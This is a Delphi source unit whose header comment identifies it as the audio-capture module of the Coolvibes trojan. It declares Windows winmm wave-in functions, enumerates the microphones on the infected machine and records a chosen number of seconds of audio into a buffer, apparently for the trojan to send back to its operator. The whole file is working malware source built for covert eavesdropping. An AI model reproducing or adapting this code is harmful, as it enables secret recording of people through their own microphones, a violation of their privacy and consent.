{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para captura de audio}
unit UnitAudio;

interface

uses
  Windows, sysutils, UnitVariables;

  const
  WAVE_INVALIDFORMAT     = $00000000;       { invalid format }
  WAVE_FORMAT_1M08       = $00000001;       { 11.025 kHz, Mono,   8-bit  }
  WAVE_FORMAT_1S08       = $00000002;       { 11.025 kHz, Stereo, 8-bit  }
  WAVE_FORMAT_1M16       = $00000004;       { 11.025 kHz, Mono,   16-bit }
  WAVE_FORMAT_1S16       = $00000008;       { 11.025 kHz, Stereo, 16-bit }
  WAVE_FORMAT_2M08       = $00000010;       { 22.05  kHz, Mono,   8-bit  }
  WAVE_FORMAT_2S08       = $00000020;       { 22.05  kHz, Stereo, 8-bit  }
  WAVE_FORMAT_2M16       = $00000040;       { 22.05  kHz, Mono,   16-bit }
  WAVE_FORMAT_2S16       = $00000080;       { 22.05  kHz, Stereo, 16-bit }
  WAVE_FORMAT_4M08       = $00000100;       { 44.1   kHz, Mono,   8-bit  }
  WAVE_FORMAT_4S08       = $00000200;       { 44.1   kHz, Stereo, 8-bit  }
  WAVE_FORMAT_4M16       = $00000400;       { 44.1   kHz, Mono,   16-bit }
  WAVE_FORMAT_4S16       = $00000800;       { 44.1   kHz, Stereo, 16-bit }

  type
    PHWAVE = ^HWAVE;
    HWAVE = Integer;
    PHWAVEOUT = ^HWAVEOUT;
    HWAVEOUT = Integer;
    MMRESULT = UINT;                   { error return code, 0 means no error }
    MMVERSION = UINT;
    
    //Dispositivo de sonido
    tagWAVEINCAPSA = record
      wMid: Word;                        { manufacturer ID }
      wPid: Word;                        { product ID }
      vDriverVersion: MMVERSION;         { version of the driver }
      szPname: array[0..31] of AnsiChar;    { product name (NULL terminated string) }
      dwFormats: DWORD;                { formats supported }
      wChannels: Word;                 { number of channels supported }
      wReserved1: Word;                { structure packing }
    end;

    TWaveInCapsA = tagWAVEINCAPSA;
    PWaveInCapsA = ^TWaveInCapsA;
    PWaveInCaps = PWaveInCapsA;

    //Tipo de formato de audio
    TWaveFormat = record
      wFormatTag: Word;         {format type}
      nChannels: Word;          {number of channels 1 for mono 2 for stereo}
      nSamplesPerSec: Longint;  {sample rate}
      nAvgBytesPerSec: Longint; {number of bytes per second recorded}
      nBlockAlign: Word;        {size of a single sample}
    end;

    TPCMWaveFormat = record
      wf: TWaveFormat;
      wBitsPerSample: Word; //8 o 16
    end;
      PPCMWaveFormat = ^TPCMWaveFormat;
      HWAVEIN = Integer;
      PHWAVEIN = ^HWAVEIN;


    type
      PWaveFormat = ^TWaveFormat;
      waveformat_tag = packed record
      wFormatTag: Word;         { format type }
      nChannels: Word;          { number of channels (i.e. mono, stereo, etc.) }
      nSamplesPerSec: DWORD;  { sample rate }
      nAvgBytesPerSec: DWORD; { for buffer estimation }
      nBlockAlign: Word;      { block size of data }
    end;

    tWAVEFORMATEX = packed record
      wFormatTag: Word;         { format type }
      nChannels: Word;          { number of channels (i.e. mono, stereo, etc.) }
      nSamplesPerSec: DWORD;  { sample rate }
      nAvgBytesPerSec: DWORD; { for buffer estimation }
      nBlockAlign: Word;      { block size of data }
      wBitsPerSample: Word;   { number of bits per sample of mono data }
      cbSize: Word;           { the count in bytes of the size of }
    end;

    PWaveFormatEx = ^TWaveFormatEx;
    PWaveHdr = ^TWaveHdr;
    wavehdr_tag = record
      lpData: PChar;              { pointer to locked data buffer }
      dwBufferLength: DWORD;      { length of data buffer }
      dwBytesRecorded: DWORD;     { used for input only }
      dwUser: DWORD;              { for client's use }
      dwFlags: DWORD;             { assorted flags (see defines) }
      dwLoops: DWORD;             { loop control counter }
      lpNext: PWaveHdr;           { reserved for driver }
      reserved: DWORD;            { reserved for driver }
    end;
    TWaveHdr = wavehdr_tag;
    WAVEHDR = wavehdr_tag;
//API func
  function waveInGetDevCaps(hwo: HWAVEOUT; lpCaps: PWaveInCaps; uSize: UINT): MMRESULT; stdcall;
  function waveInOpen(lphWaveIn: PHWAVEIN; uDeviceID: UINT;
  lpFormatEx: PWaveFormatEx; dwCallback, dwInstance, dwFlags: DWORD): MMRESULT; stdcall;
  function waveInPrepareHeader(hWaveIn: HWAVEIN; lpWaveInHdr: PWaveHdr;
  uSize: UINT): MMRESULT; stdcall;
  function waveInAddBuffer(hWaveIn: HWAVEIN; lpWaveInHdr: PWaveHdr;
  uSize: UINT): MMRESULT; stdcall;
  function waveInStart(hWaveIn: HWAVEIN): MMRESULT; stdcall;
  function waveInStop(hWaveIn: HWAVEIN): MMRESULT; stdcall;
  function waveInClose(hWaveIn: HWAVEIN): MMRESULT; stdcall;
//API
  function waveInGetDevCaps; external 'winmm.dll' name 'waveInGetDevCapsA';
  function waveInOpen; external 'winmm.dll' name 'waveInOpen';
  function waveInPrepareHeader; external 'winmm.dll' name 'waveInPrepareHeader';
  function waveInAddBuffer; external 'winmm.dll' name 'waveInAddBuffer';
  function waveInStart; external 'winmm.dll' name 'waveInStart';
  function waveInStop; external 'winmm.dll' name 'waveInStop';
  function waveInClose; external 'winmm.dll' name 'waveInClose';




  function DispositivosDeAudio():string; //Para conseguir la lista de los micrófonos del pc
  function GrabaAudio(Dispositivo:integer;Duracion: integer;CapturasPorSegundo, BitsPorCaptura, Canales: word;var tmp : string):string;    //Graba X segundos de audio de un dispositivo determinado
  procedure StartRecording(Parameter: Pointer);

type
  TAudioInfo = class(TObject)
  public
    disp, dur , hz , bits, chan : integer;
    ThreadId: longword;
    constructor Create(fDisp, fDur, fhz, fbits, fchan:integer); overload;

end;
  
implementation

var
  Hwaveinh      : HWaveIn;

  constructor TAudioInfo.Create(fDisp, fDur, fhz, fbits, fchan:integer);
  begin
    Disp :=   fDisp;
    Dur  :=   fDur;
    hz   :=   fHZ;
    bits :=   fBits;
    chan :=   fChan;
  end;

  procedure StartRecording(Parameter: Pointer);
  var
    AudioInfo: TAudioInfo;
    Tmp : string;
  begin
    AudioInfo := TAudioInfo(Parameter);
    GrabaAudio(AudioInfo.Disp, AudioInfo.Dur, AudioInfo.hz, AudioInfo.bits, AudioInfo.chan,tmp);
    RecordedAudio := tmp;
    ExitThread(0);
  end;
  
  function DispositivosDeAudio():string;    //Lista los dispositivos de audio disponibles 
  var
    WaveInCaps : TWaveInCapsA;
    i,x : integer;
  begin
    x := 0;
    repeat
      i := waveInGetDevCaps(x,@waveInCaps,sizeof(WaveInCaps));
      if i=0 then
      begin
        //Mandamos los nombres de los dispositivos
        Result := Result + inttostr(x)+' - '+WaveInCaps.szPname+'(v '+inttostr(WaveInCaps.vDriverVersion)+')'+'|';
        Inc(x);
      end;
      if x = 10 then break;  //En algunos pcs pasa :S
    until i<>0;
    if Result = '' then result := '-|'; //No tiene ningún dispositivo de entrada
  end;
  
  function GrabaAudio(Dispositivo:integer;Duracion: integer;CapturasPorSegundo, BitsPorCaptura, Canales: word;var tmp : string):string;   //Graba X segundos de audio de un dispositivo determinado
  var
    wFormato : TWaveFormatEx;
    Header : WAVEHDR;
    h : integer;
    BufferSize : integer;
  begin


    wFormato.WFormatTag := 1;
    wFormato.NChannels:=Canales; //1=mono 2= stereo
    wFormato.wBitsPerSample:=BitsPorCaptura; //8,16
    wFormato.NSamplesPerSec:=CapturasPorSegundo;//HZ
    wFormato.NBlockAlign:=((wFormato.nChannels * wFormato.wBitsPerSample) div 8);
    wFormato.NAvgBytesPerSec:=wFormato.NSamplesPerSec*wFormato.NBlockAlign;
    wFormato.cbSize:= 0;
    Buffersize :=  (wFormato.NSamplesPerSec * wFormato.NChannels*wFormato.wBitsPerSample)*duracion div 8;
    //Primero miramos a ver si el formato es compatible
    h:=WaveInOpen(@Dispositivo,0,@wFormato,0,0,$0001{WAVE_FORMAT_QUERY});
    if (h <> 0) then begin Result := 'ERROR1'; exit; end;   //Formato no compatible con el dispositivo


    
    Hwaveinh := 0;
    h:=WaveInOpen(@Dispositivo,0,@wFormato,0,0,$00000000{No callback});
    if (h <> 0) then begin Result := 'ERROR2'; exit; end;  //Error al intentar crear el handle


    header.dwbufferlength:=BufferSize;
    header.dwbytesrecorded:=0;                                
    header.dwUser:=0;
    header.dwflags:=0;
    header.dwloops:=0;
    Header.lpData := nil;
    Getmem(Header.lpData,BufferSize);

    h:=waveInPrepareHeader(Dispositivo,@Header,sizeof(TWavehdr));
    if (h <> 0) then begin Result := 'ERROR3'; exit; end;  //Error al intentar preparar los headers

    h:=waveInAddBuffer(Dispositivo,@Header,sizeof(TWaveHdr));
    if (h <> 0) then begin Result := 'ERROR4'; exit; end;  //Error al intentar mandarle el buffer

    h:=waveInStart(Dispositivo);
    if (h <> 0) then begin Result := 'ERROR5'; exit; end;  //Error al intentar comenzar a grabar..
    Result := result+'|';

    while ((Header.dwFlags and $00000001) <> $00000001)  do
				Sleep(1);




    tmp := '';
    setlength(tmp, header.dwBytesRecorded);
    movememory(pointer(tmp), pointer(header.lpdata), header.dwBytesRecorded);
    waveInStop(Dispositivo);
    waveInClose(Dispositivo);
  end;

  
end.